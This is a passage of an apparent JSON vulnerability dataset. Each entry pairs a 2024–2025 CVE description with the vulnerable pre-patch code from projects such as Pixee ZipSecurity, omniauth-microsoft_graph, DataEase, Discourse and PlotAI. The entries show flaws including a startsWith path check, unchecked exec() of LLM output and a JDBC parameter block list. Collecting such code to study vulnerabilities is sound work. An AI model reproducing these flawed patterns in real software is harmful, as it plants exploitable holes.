    "description": "The Pixee Java Code Security Toolkit is a set of security APIs meant to help secure Java code. `ZipSecurity#isBelowCurrentDirectory` is vulnerable to a partial-path traversal bypass. To be vulnerable to the bypass, the application must use toolkit version <=1.1.1, use ZipSecurity as a guard against path traversal, and have an exploit path. Although the control still protects attackers from escaping the application path into higher level directories (e.g., /etc/), it will allow \"escaping\" into sibling paths. For example, if your running path is /my/app/path you an attacker could navigate into /my/app/path-something-else. This vulnerability is patched in 1.1.2.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/io/github/pixee/security/ZipSecurity.java",
          "content": "package io.github.pixee.security;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.nio.charset.Charset;\nimport java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\n\n/**\n * This type exposes helper methods to deal with attacks related to Zipping operations, most notably\n * the \"zip slip\" attack.\n */\npublic final class ZipSecurity {\n\n  private ZipSecurity() {}\n\n  /**\n   * Returns a {@link ZipInputStream} that will check to make sure that paths encountered in the zip\n   * aren't absolute and don't contain escapes (\"..\") towards directories outside the zip's root.\n   */\n  public static ZipInputStream createHardenedInputStream(\n      final InputStream stream, final Charset charset) {\n    return new HardenedZipInputStream(stream, charset);\n  }\n\n  /**\n   * Returns a {@link ZipInputStream} that will check to make sure that paths encountered in the zip\n   * aren't absolute and don't contain escapes (\"..\") towards directories beyond the root of the\n   * zip.\n   */\n  public static ZipInputStream createHardenedInputStream(final InputStream stream) {\n    return new HardenedZipInputStream(stream);\n  }\n\n  private static class HardenedZipInputStream extends ZipInputStream {\n\n    private HardenedZipInputStream(final InputStream in) {\n      super(in);\n    }\n\n    private HardenedZipInputStream(final InputStream in, final Charset charset) {\n      super(in, charset);\n    }\n\n    /**\n     * {@inheritDoc}\n     *\n     * <p>Also checks to see that the path isn't absolute (starts with a root path), doesn't contain\n     * escapes that lead above the root of the zip.\n     */\n    @Override\n    public ZipEntry getNextEntry() throws IOException {\n      final ZipEntry entry = super.getNextEntry();\n      final String name = entry.getName();\n\n      if (!\"\".equals(name.trim())) {\n        if (isRootFileEntry(name)) {\n          throw new SecurityException(\"encountered zip file path that is absolute: \" + name);\n        }\n        if (containsEscapesAndTargetsBelowRoot(name)) {\n          throw new SecurityException(\"path to sensitive locations contained escapes: \" + name);\n        }\n      }\n      return entry;\n    }\n\n    private boolean containsEscapesAndTargetsBelowRoot(final String name) {\n      if (name.contains(\"../\") || name.contains(\"..\\\\\")) {\n        final File fileWithEscapes = new File(name);\n        try {\n          if (isBelowCurrentDirectory(fileWithEscapes)) {\n            return true;\n          }\n        } catch (IOException e) {\n          // we suppose this may happen in normal operation so best not to do anything\n        }\n      }\n      return false;\n    }\n\n    boolean isBelowCurrentDirectory(final File fileWithEscapes) throws IOException {\n      final File currentDirectory = new File(\"\");\n      String canonicalizedTargetPath = fileWithEscapes.getCanonicalPath();\n      String canonicalizedCurrentPath = currentDirectory.getCanonicalPath();\n      return !canonicalizedTargetPath.startsWith(canonicalizedCurrentPath);\n    }\n\n    private boolean isRootFileEntry(final String name) {\n      return name.startsWith(\"/\");\n    }\n  }\n}\n"
        }
      ],
      "method_level": [
        "private boolean containsEscapesAndTargetsBelowRoot(final String name) {\n      if (name.contains(\"../\") || name.contains(\"..\\\\\")) {\n        final File fileWithEscapes = new File(name);\n        try {\n          if (isBelowCurrentDirectory(fileWithEscapes)) {\n            return true;\n          }\n        } catch (IOException e) {\n          // we suppose this may happen in normal operation so best not to do anything\n        }\n      }\n      return false;\n    }",
        "boolean isBelowCurrentDirectory(final File fileWithEscapes) throws IOException {\n      final File currentDirectory = new File(\"\");\n      String canonicalizedTargetPath = fileWithEscapes.getCanonicalPath();\n      String canonicalizedCurrentPath = currentDirectory.getCanonicalPath();\n      return !canonicalizedTargetPath.startsWith(canonicalizedCurrentPath);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 70,
          "content": "        final File fileWithEscapes = new File(name);"
        },
        {
          "line_no": 72,
          "content": "          if (isBelowCurrentDirectory(fileWithEscapes)) {"
        },
        {
          "line_no": 82,
          "content": "    boolean isBelowCurrentDirectory(final File fileWithEscapes) throws IOException {"
        },
        {
          "line_no": 83,
          "content": "      final File currentDirectory = new File(\"\");"
        },
        {
          "line_no": 84,
          "content": "      String canonicalizedTargetPath = fileWithEscapes.getCanonicalPath();"
        },
        {
          "line_no": 85,
          "content": "      String canonicalizedCurrentPath = currentDirectory.getCanonicalPath();"
        },
        {
          "line_no": 86,
          "content": "      return !canonicalizedTargetPath.startsWith(canonicalizedCurrentPath);"
        }
      ]
    },
    "cwe": [
      "CWE-22"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 6,
    "cve": "CVE-2024-21632",
    "description": "omniauth-microsoft_graph provides an Omniauth strategy for the Microsoft Graph API. Prior to versions 2.0.0, the implementation did not validate the legitimacy of the `email` attribute of the user nor did it give/document an option to do so, making it susceptible to nOAuth misconfiguration in cases when the `email` is used as a trusted user identifier. This could lead to account takeover. Version 2.0.0 contains a fix for this issue.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/omniauth/strategies/microsoft_graph.rb",
          "content": "require 'omniauth-oauth2'\n\nmodule OmniAuth\n  module Strategies\n    class MicrosoftGraph < OmniAuth::Strategies::OAuth2\n      BASE_SCOPE_URL = 'https://graph.microsoft.com/'\n      BASE_SCOPES = %w[offline_access openid email profile].freeze\n      DEFAULT_SCOPE = 'offline_access openid email profile User.Read'.freeze\n\n      option :name, :microsoft_graph\n\n      option :client_options, {\n        site:          'https://login.microsoftonline.com/',\n        token_url:     'common/oauth2/v2.0/token',\n        authorize_url: 'common/oauth2/v2.0/authorize'\n      }\n\n      option :authorize_options, %i[state callback_url access_type display score auth_type scope prompt login_hint domain_hint response_mode]\n\n      option :token_params, {\n      }\n\n      option :scope, DEFAULT_SCOPE\n      option :authorized_client_ids, []\n\n      uid { raw_info[\"id\"] }\n\n      info do\n        {\n          'email' => raw_info[\"mail\"],\n          'first_name' => raw_info[\"givenName\"],\n          'last_name' => raw_info[\"surname\"],\n          'name' => [raw_info[\"givenName\"], raw_info[\"surname\"]].join(' '),\n          'nickname' => raw_info[\"displayName\"],\n        }\n      end\n\n      extra do\n        {\n          'raw_info' => raw_info,\n          'params' => access_token.params,\n          'aud' => options.client_id\n        }\n      end\n\n      def authorize_params\n        super.tap do |params|\n          options[:authorize_options].each do |k|\n            params[k] = request.params[k.to_s] unless [nil, ''].include?(request.params[k.to_s])\n          end\n\n          params[:scope] = get_scope(params)\n          params[:access_type] = 'offline' if params[:access_type].nil?\n\n          session['omniauth.state'] = params[:state] if params[:state]\n        end\n      end     \n\n      def raw_info\n        @raw_info ||= access_token.get('https://graph.microsoft.com/v1.0/me').parsed\n      end\n\n      def callback_url\n        options[:callback_url] || full_host + script_name + callback_path\n      end  \n\n      def custom_build_access_token\n        access_token = get_access_token(request)\n        access_token\n      end\n\n      alias build_access_token custom_build_access_token\n\n      private\n\n      def get_access_token(request)\n        verifier = request.params['code']\n        redirect_uri = request.params['redirect_uri'] || request.params['callback_url']\n        if verifier && request.xhr?\n          client_get_token(verifier, redirect_uri || '/auth/microsoft_graph/callback')\n        elsif verifier\n          client_get_token(verifier, redirect_uri || callback_url)\n        elsif verify_token(request.params['access_token'])\n          ::OAuth2::AccessToken.from_hash(client, request.params.dup)\n        elsif request.content_type =~ /json/i\n          begin\n            body = JSON.parse(request.body.read)\n            request.body.rewind # rewind request body for downstream middlewares\n            verifier = body && body['code']\n            client_get_token(verifier, '/auth/microsoft_graph/callback') if verifier\n          rescue JSON::ParserError => e\n            warn \"[omniauth microsoft_graph] JSON parse error=#{e}\"\n          end\n        end\n      end\n\n      def client_get_token(verifier, redirect_uri)\n        client.auth_code.get_token(verifier, get_token_options(redirect_uri), get_token_params)\n      end\n\n      def get_token_params\n        deep_symbolize(options.auth_token_params || {})\n      end\n\n      def get_token_options(redirect_uri = '')\n        { redirect_uri: redirect_uri }.merge(token_params.to_hash(symbolize_keys: true))\n      end\n\n      def get_scope(params)\n        raw_scope = params[:scope] || DEFAULT_SCOPE\n        scope_list = raw_scope.split(' ').map { |item| item.split(',') }.flatten\n        scope_list.map! { |s| s =~ %r{^https?://} || BASE_SCOPES.include?(s) ? s : \"#{BASE_SCOPE_URL}#{s}\" }\n        scope_list.join(' ')\n      end\n\n      def verify_token(access_token)\n        return false unless access_token\n        # access_token.get('https://graph.microsoft.com/v1.0/me').parsed\n        raw_response = client.request(:get, 'https://graph.microsoft.com/v1.0/me',\n                                      params: { access_token: access_token }).parsed\n        (raw_response['aud'] == options.client_id) || options.authorized_client_ids.include?(raw_response['aud'])\n      end              \n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def authorize_params\n        super.tap do |params|\n          options[:authorize_options].each do |k|\n            params[k] = request.params[k.to_s] unless [nil, ''].include?(request.params[k.to_s])\n          end\n\n          params[:scope] = get_scope(params)\n          params[:access_type] = 'offline' if params[:access_type].nil?\n\n          session['omniauth.state'] = params[:state] if params[:state]\n        end\n      end",
        "def callback_url\n        options[:callback_url] || full_host + script_name + callback_path\n      end",
        "def verify_token(access_token)\n        return false unless access_token\n        # access_token.get('https://graph.microsoft.com/v1.0/me').parsed\n        raw_response = client.request(:get, 'https://graph.microsoft.com/v1.0/me',\n                                      params: { access_token: access_token }).parsed\n        (raw_response['aud'] == options.client_id) || options.authorized_client_ids.include?(raw_response['aud'])\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 57,
          "content": "      end     "
        },
        {
          "line_no": 65,
          "content": "      end  "
        },
        {
          "line_no": 122,
          "content": "      end              "
        }
      ]
    },
    "cwe": [
      "CWE-287"
    ],
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_version": 3.1
  },
  {
    "id": 1180,
    "cve": "CVE-2024-32034",
    "description": "decidim is a Free Open-Source participatory democracy, citizen participation and open government for cities and organizations. The admin panel is subject to potential Cross-site scripting (XSS) attach in case an admin assigns a valuator to a proposal, or does any other action that generates an admin activity log where one of the resources has an XSS crafted. This issue has been addressed in release version 0.27.7, 0.28.2, and newer. Users are advised to upgrade. Users unable to upgrade may redirect the pages /admin and /admin/logs to other admin pages to prevent this access (i.e. `/admin/organization/edit`).",
    "vulnerability": {
      "file_level": [
        {
          "name": "decidim-core/app/presenters/decidim/admin_log/organization_presenter.rb",
          "content": "# frozen_string_literal: true\n\nmodule Decidim\n  module AdminLog\n    # This class holds the logic to present a `Decidim::Organization`\n    # for the `AdminLog` log.\n    #\n    # Usage should be automatic and you shouldn't need to call this class\n    # directly, but here's an example:\n    #\n    #    action_log = Decidim::ActionLog.last\n    #    view_helpers # => this comes from the views\n    #    OrganizationPresenter.new(action_log, view_helpers).present\n    class OrganizationPresenter < Decidim::Log::BasePresenter\n      private\n\n      def diff_fields_mapping\n        return { external_domain_whitelist: :string } if action == \"update_external_domain\"\n\n        settings_attributes_mapping\n          .merge(omnipresent_banner_attributes_mapping)\n          .merge(highlighted_content_banner_attributes_mapping)\n          .merge(appearance_attributes_mapping)\n          .merge(id_documents_attributes_mapping)\n      end\n\n      def settings_attributes_mapping\n        {\n          name: :string,\n          default_locale: :locale,\n          reference_prefix: :string,\n          twitter_handler: :string,\n          facebook_handler: :string,\n          instagram_handler: :string,\n          youtube_handler: :string,\n          github_handler: :string,\n          tos_version: :datetime\n        }\n      end\n\n      def omnipresent_banner_attributes_mapping\n        {\n          enable_omnipresent_banner: :boolean,\n          omnipresent_banner_url: :string,\n          omnipresent_banner_short_description: :i18n,\n          omnipresent_banner_title: :i18n\n        }\n      end\n\n      def highlighted_content_banner_attributes_mapping\n        {\n          highlighted_content_banner_enabled: :boolean,\n          highlighted_content_banner_action_url: :string,\n          highlighted_content_banner_image: :string,\n          highlighted_content_banner_title: :i18n,\n          highlighted_content_banner_short_description: :i18n,\n          highlighted_content_banner_action_title: :i18n,\n          highlighted_content_banner_action_subtitle: :i18n\n        }\n      end\n\n      def appearance_attributes_mapping\n        {\n          cta_button_path: :string,\n          cta_button_text: :i18n,\n          description: :i18n,\n          logo: :string,\n          header_snippets: :string,\n          favicon: :string,\n          official_img_header: :string,\n          official_img_footer: :string,\n          official_url: :string\n        }\n      end\n\n      def id_documents_attributes_mapping\n        {\n          id_documents_methods: :string,\n          id_documents_explanation_text: :i18n\n        }\n      end\n\n      def action_string\n        case action\n        when \"update_id_documents_config\", \"update_external_domain\"\n          \"decidim.admin_log.organization.#{action}\"\n        else\n          \"decidim.admin_log.organization.update\"\n        end\n      end\n\n      def i18n_labels_scope\n        \"activemodel.attributes.organization\"\n      end\n\n      def diff_actions\n        super + %w(update_id_documents_config update_external_domain)\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def settings_attributes_mapping\n        {\n          name: :string,\n          default_locale: :locale,\n          reference_prefix: :string,\n          twitter_handler: :string,\n          facebook_handler: :string,\n          instagram_handler: :string,\n          youtube_handler: :string,\n          github_handler: :string,\n          tos_version: :datetime\n        }\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 29,
          "content": "          name: :string,"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 207,
    "cve": "CVE-2024-24754",
    "description": "Bref enable serverless PHP on AWS Lambda. When Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object. During the conversion process, if the request is a MultiPart, each part is parsed and its content added in the `$files` or `$parsedBody` arrays. The conversion process produces a different output compared to the one of plain PHP when keys ending with and open square bracket ([) are used. Based on the application logic the difference in the body parsing might lead to vulnerabilities and/or undefined behaviors. This vulnerability is patched in 2.1.13.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Event/Http/Psr7Bridge.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Bref\\Event\\Http;\n\nuse Bref\\Context\\Context;\nuse Nyholm\\Psr7\\ServerRequest;\nuse Nyholm\\Psr7\\Stream;\nuse Nyholm\\Psr7\\UploadedFile;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Riverline\\MultiPartParser\\Part;\nuse RuntimeException;\n\nuse function str_starts_with;\n\n/**\n * Bridges PSR-7 requests and responses with API Gateway or ALB event/response formats.\n */\nfinal class Psr7Bridge\n{\n    /**\n     * Create a PSR-7 server request from an AWS Lambda HTTP event.\n     */\n    public static function convertRequest(HttpRequestEvent $event, Context $context): ServerRequestInterface\n    {\n        $headers = $event->getHeaders();\n\n        [$files, $parsedBody] = self::parseBodyAndUploadedFiles($event);\n        [$user, $password] = $event->getBasicAuthCredentials();\n\n        $server = array_filter([\n            'CONTENT_LENGTH' => $headers['content-length'][0] ?? null,\n            'CONTENT_TYPE' => $event->getContentType(),\n            'DOCUMENT_ROOT' => getcwd(),\n            'QUERY_STRING' => $event->getQueryString(),\n            'REQUEST_METHOD' => $event->getMethod(),\n            'SERVER_NAME' => $event->getServerName(),\n            'SERVER_PORT' => $event->getServerPort(),\n            'SERVER_PROTOCOL' => $event->getProtocol(),\n            'PATH_INFO' => $event->getPath(),\n            'HTTP_HOST' => $headers['host'] ?? null,\n            'REMOTE_ADDR' => $event->getSourceIp(),\n            'REMOTE_PORT' => $event->getRemotePort(),\n            'REQUEST_TIME' => time(),\n            'REQUEST_TIME_FLOAT' => microtime(true),\n            'REQUEST_URI' => $event->getUri(),\n            'PHP_AUTH_USER' => $user,\n            'PHP_AUTH_PW' => $password,\n        ]);\n\n        foreach ($headers as $name => $values) {\n            $server['HTTP_' . strtoupper(str_replace('-', '_', (string) $name))] = $values[0];\n        }\n\n        /**\n         * Nyholm/psr7 does not rewind body streams, we do it manually\n         * so that users can fetch the content of the body directly.\n         */\n        $bodyStream = Stream::create($event->getBody());\n        $bodyStream->rewind();\n\n        $request = new ServerRequest(\n            $event->getMethod(),\n            $event->getUri(),\n            $event->getHeaders(),\n            $bodyStream,\n            $event->getProtocolVersion(),\n            $server\n        );\n\n        foreach ($event->getPathParameters() as $key => $value) {\n            $request = $request->withAttribute($key, $value);\n        }\n\n        return $request->withUploadedFiles($files)\n            ->withCookieParams($event->getCookies())\n            ->withQueryParams($event->getQueryParameters())\n            ->withParsedBody($parsedBody)\n            ->withAttribute('lambda-event', $event)\n            ->withAttribute('lambda-context', $context);\n    }\n\n    /**\n     * Create a ALB/API Gateway response from a PSR-7 response.\n     */\n    public static function convertResponse(ResponseInterface $response): HttpResponse\n    {\n        $response->getBody()->rewind();\n        $body = $response->getBody()->getContents();\n\n        return new HttpResponse($body, $response->getHeaders(), $response->getStatusCode());\n    }\n\n    private static function parseBodyAndUploadedFiles(HttpRequestEvent $event): array\n    {\n        $bodyString = $event->getBody();\n        $files = [];\n        $parsedBody = null;\n        $contentType = $event->getContentType();\n        if ($contentType !== null && $event->getMethod() === 'POST') {\n            if (str_starts_with($contentType, 'application/x-www-form-urlencoded')) {\n                parse_str($bodyString, $parsedBody);\n            } else {\n                $document = new Part(\"Content-type: $contentType\\r\\n\\r\\n\" . $bodyString);\n                if ($document->isMultiPart()) {\n                    $parsedBody = [];\n                    foreach ($document->getParts() as $part) {\n                        if ($part->isFile()) {\n                            $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');\n                            if ($tmpPath === false) {\n                                throw new RuntimeException('Unable to create a temporary directory');\n                            }\n                            file_put_contents($tmpPath, $part->getBody());\n                            $file = new UploadedFile($tmpPath, filesize($tmpPath), UPLOAD_ERR_OK, $part->getFileName(), $part->getMimeType());\n\n                            self::parseKeyAndInsertValueInArray($files, $part->getName(), $file);\n                        } else {\n                            self::parseKeyAndInsertValueInArray($parsedBody, $part->getName(), $part->getBody());\n                        }\n                    }\n                }\n            }\n        }\n        return [$files, $parsedBody];\n    }\n\n    /**\n     * Parse a string key like \"files[id_cards][jpg][]\" and do $array['files']['id_cards']['jpg'][] = $value\n     */\n    private static function parseKeyAndInsertValueInArray(array &$array, string $key, mixed $value): void\n    {\n        if (! str_contains($key, '[')) {\n            $array[$key] = $value;\n\n            return;\n        }\n\n        $parts = explode('[', $key); // files[id_cards][jpg][] => [ 'files',  'id_cards]', 'jpg]', ']' ]\n        $pointer = &$array;\n\n        foreach ($parts as $k => $part) {\n            if ($k === 0) {\n                $pointer = &$pointer[$part];\n\n                continue;\n            }\n\n            // Skip two special cases:\n            // [[ in the key produces empty string\n            // [test : starts with [ but does not end with ]\n            if ($part === '' || ! str_ends_with($part, ']')) {\n                // Malformed key, we use it \"as is\"\n                $array[$key] = $value;\n\n                return;\n            }\n\n            $part = substr($part, 0, -1); // The last char is a ] => remove it to have the real key\n\n            if ($part === '') { // [] case\n                $pointer = &$pointer[];\n            } else {\n                $pointer = &$pointer[$part];\n            }\n        }\n\n        $pointer = $value;\n    }\n}\n"
        }
      ],
      "method_level": [
        "private static function parseBodyAndUploadedFiles(HttpRequestEvent $event): array\n    {\n        $bodyString = $event->getBody();\n        $files = [];\n        $parsedBody = null;\n        $contentType = $event->getContentType();\n        if ($contentType !== null && $event->getMethod() === 'POST') {\n            if (str_starts_with($contentType, 'application/x-www-form-urlencoded')) {\n                parse_str($bodyString, $parsedBody);\n            } else {\n                $document = new Part(\"Content-type: $contentType\\r\\n\\r\\n\" . $bodyString);\n                if ($document->isMultiPart()) {\n                    $parsedBody = [];\n                    foreach ($document->getParts() as $part) {\n                        if ($part->isFile()) {\n                            $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');\n                            if ($tmpPath === false) {\n                                throw new RuntimeException('Unable to create a temporary directory');\n                            }\n                            file_put_contents($tmpPath, $part->getBody());\n                            $file = new UploadedFile($tmpPath, filesize($tmpPath), UPLOAD_ERR_OK, $part->getFileName(), $part->getMimeType());\n\n                            self::parseKeyAndInsertValueInArray($files, $part->getName(), $file);\n                        } else {\n                            self::parseKeyAndInsertValueInArray($parsedBody, $part->getName(), $part->getBody());\n                        }\n                    }\n                }\n            }\n        }\n        return [$files, $parsedBody];\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 109,
          "content": "                            $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');"
        }
      ]
    },
    "cwe": [
      "CWE-436"
    ],
    "severity": "LOW",
    "cvss_score": 3.7,
    "cvss_version": 3.1
  },
  {
    "id": 399,
    "cve": "CVE-2024-23328",
    "description": "Dataease is an open source data visualization analysis tool. A deserialization vulnerability exists in the DataEase datasource, which can be exploited to execute arbitrary code. The location of the vulnerability code is `core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java.` The blacklist of mysql jdbc attacks can be bypassed and attackers can further exploit it for deserialized execution or reading arbitrary files. This vulnerability is patched in 1.18.15 and 2.3.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java",
          "content": "package io.dataease.datasource.type;\n\nimport io.dataease.api.ds.vo.DatasourceConfiguration;\nimport io.dataease.exception.DEException;\nimport lombok.Data;\nimport org.apache.commons.lang3.StringUtils;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Arrays;\nimport java.util.List;\n\n@Data\n@Component(\"mysql\")\npublic class Mysql extends DatasourceConfiguration {\n    private String driver = \"com.mysql.cj.jdbc.Driver\";\n    private String extraParams = \"characterEncoding=UTF-8&connectTimeout=5000&useSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\";\n    private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n    private List<String> showTableSqls = Arrays.asList(\"show tables\");\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    DEException.throwException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    DEException.throwException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 28,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.1
  },
  {
    "id": 1022,
    "cve": "CVE-2024-39320",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, the vulnerability allows an attacker to inject iframes from any domain, bypassing the intended restrictions enforced by the allowed_iframes setting. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 66,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 67,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-74",
      "CWE-1021"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 57,
    "cve": "CVE-2025-1497",
    "description": "A vulnerability, that could result in Remote Code Execution (RCE), has been found in PlotAI. Lack of validation of LLM-generated output allows attacker to execute arbitrary Python code.\nVendor commented out vulnerable line, further usage of the software requires uncommenting it and thus accepting the risk. The vendor does not plan to release a patch to fix this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plotai/code/executor.py",
          "content": "\n\nfrom tempfile import TemporaryFile\n\n\nclass Executor:\n\n    def run(self, code, globals_env=None, locals_env=None):\n        try:\n            tmp_code = \"\"\n            for line in code.split(\"\\n\"):\n                if not line.startswith(\"```\"):\n                    tmp_code += line + \"\\n\"\n\n            exec(tmp_code, globals_env, locals_env)\n        except Exception as e:\n            return str(e)\n        return None"
        }
      ],
      "method_level": [
        "def run(self, code, globals_env=None, locals_env=None):\n        try:\n            tmp_code = \"\"\n            for line in code.split(\"\\n\"):\n                if not line.startswith(\"```\"):\n                    tmp_code += line + \"\\n\"\n\n            exec(tmp_code, globals_env, locals_env)\n        except Exception as e:\n            return str(e)\n        return None"
      ],
      "hunk_level": [
        {
          "line_no": 15,
          "content": "            exec(tmp_code, globals_env, locals_env)"
        }
      ]
    },
    "cwe": [
      "CWE-77"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.3,
    "cvss_version": 4.0
  },
  {
    "id": 1154,
    "cve": "CVE-2024-45400",
